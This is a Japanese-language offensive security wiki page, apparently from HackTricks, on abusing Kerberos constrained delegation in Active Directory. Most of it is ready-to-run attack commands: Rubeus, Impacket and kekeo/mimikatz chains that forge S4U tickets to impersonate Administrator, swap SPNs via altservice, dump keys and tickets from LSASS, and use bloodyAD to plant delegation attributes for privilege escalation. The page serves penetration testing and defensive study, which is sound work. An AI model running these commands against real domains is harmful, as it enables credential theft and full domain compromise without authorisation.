# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

これを使用すると、Domain admin はコンピューターがマシン上の任意の **service** に対して **user または computer を impersonate** することを **allow** できます。

- **Service for User to self (_S4U2self_):** **SPN を所有する service account** は通常、任意の user に代わって自身への TGS を取得できます。アカウントの _userAccountControl_ に [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) も設定されている場合、その TGS は **forwardable** になります。これにより、protocol transition が **classic constrained delegation** で直接役立ちます。
- **Service for User to Proxy(_S4U2proxy_):** **service account** は、**msDS-AllowedToDelegateTo** に記載された SPN に対して、user に代わる TGS を取得できます。S4U2Proxy で使用される evidence ticket は、delegating service への **forwardable** ticket でなければなりません。これは、victim から取得した実際の client-to-service ticket、または **S4U2Self + T2A4D** で生成した ticket のいずれかです。

**Note**: AD で user に「_Account is sensitive and cannot be delegated_」が設定されている場合、または **Protected Users** のメンバーである場合、通常は constrained delegation を通じてその user を **impersonate** できません。Modern domain では、delegation が有効なアカウントを target にする際、RC4-only の前提よりも **AES** material を優先してください。

つまり、**service の hash を compromise** できれば、user を **impersonate** し、指定されたマシン上の任意の **service** に対して、その user に代わって **access** を取得できます（privesc の可能性があります）。

さらに、user が impersonate できる service だけでなく、**任意の service** にも **access** できます。これは、SPN（要求された service name）がチェックされないためです（ticket 内では、この部分が暗号化または署名されていません）。したがって、**CIFS service** に access できる場合、たとえば Rubeus の `/altservice` flag を使用して **HOST service** にも access できます。同じ SPN swapping の弱点は、Impacket の `getST -altservice` やその他の tooling でも悪用されます。

また、**DC 上の LDAP service access** は、**DCSync** を exploit するために必要なものです。
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Operator note:** **ADUC** や BloodHound のスクリーンショットだけを信頼して **gMSA/sMSA** のレビューを行わないでください。これらのアカウントでは通常の Delegation タブが表示されないことが多いため、raw **`userAccountControl`** および **`msDS-AllowedToDelegateTo`** attributes を直接列挙してください。
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition と Kerberos-only constrained delegation

侵害されたアカウントに **T2A4D** がある場合、通常はサービスキー/TGT だけで完全な **`S4U2Self -> S4U2Proxy`** chain を完了できます。<sup>[[2]](#references)</sup>

**`msDS-AllowedToDelegateTo`** しかない場合（classic **"Use Kerberos only"** mode）、delegation は引き続き悪用できますが、S4U2Proxy の evidence ticket は、delegating service 用の**実際の forwardable user-to-service ticket**でなければなりません。実際には、被害者の TGS を **LSASS/ccache** から盗むか capture し、それを second stage（Rubeus の `/tgs:`）に渡す必要があります。**non-forwardable** S4U2Self ticket は classic constrained delegation には不十分です。それが唯一の evidence ticket である場合は、代わりに [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) を確認してください。<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation notes (2025+)

**Windows Server 2012/2012 R2** 以降、KDC は S4U2Proxy extensions を介した **cross-domain/forests** 間の **constrained delegation** をサポートしています。Modern builds（Windows Server 2016–2025）でもこの動作は維持され、protocol transition を示す 2 つの PAC SIDs が追加されています。<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) は、user が通常どおり authentication された場合に付与されます。
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) は、service が protocol transition を通じて identity を assert した場合に付与されます。

protocol transition が across domains で使用された場合、PAC 内に `SERVICE_ASSERTED_IDENTITY` が含まれることを想定してください。これは、S4U2Proxy step が成功したことを確認するものです。<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket（0.11.x+）では、Rubeus と同じ S4U chain および SPN swapping が利用できます。<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
ユーザー ST を先に forging する場合（例：offline hash しかない場合）は、S4U2Proxy に **ticketer.py** と **getST.py** を組み合わせます。すでに動作する ccache があり、同じホストの service class だけを swap する必要がある場合は、**tgssub.py** も便利です。現在の quirks（forged ST が SPN key と一致しない場合の KRB_AP_ERR_MODIFIED）については、公開されている Impacket issue #1713 を参照してください。<sup>[[2]](#references)</sup>

### low-priv creds から delegation setup を自動化する

すでに computer または service account に対する **GenericAll/WriteDACL** を保持している場合、**bloodyAD**（2024+）を使用すると、RSAT なしで必要な attributes をリモートから設定できます。
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
これにより、これらの属性に書き込み可能になった時点で、DA権限なしにprivesc用のconstrained delegation pathを構築できます。

- Step 1: **許可されたserviceのTGTを取得**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> **Printer Bug**や**unconstrained delegation**、NTLM relaying、Active Directory Certificate Service abuseなど、コンピューター上でSYSTEMにならずに**TGT ticket**や**RC4**、**AES256**を取得する方法は他にもあります。
>
> **そのTGT ticket（またはハッシュ）さえあれば、コンピューター全体をcompromiseせずにこの攻撃を実行できます。**

- Step2: **ユーザーになりすましてサービス用のTGSを取得する**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**ired.teamに詳細情報があります。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) および [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos Constrained Delegation 概要 (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacketを使用したDelegationの悪用（Part 2）：Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [KerberosityがDomainを破壊した：攻撃側から見たKerberosの概要 (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
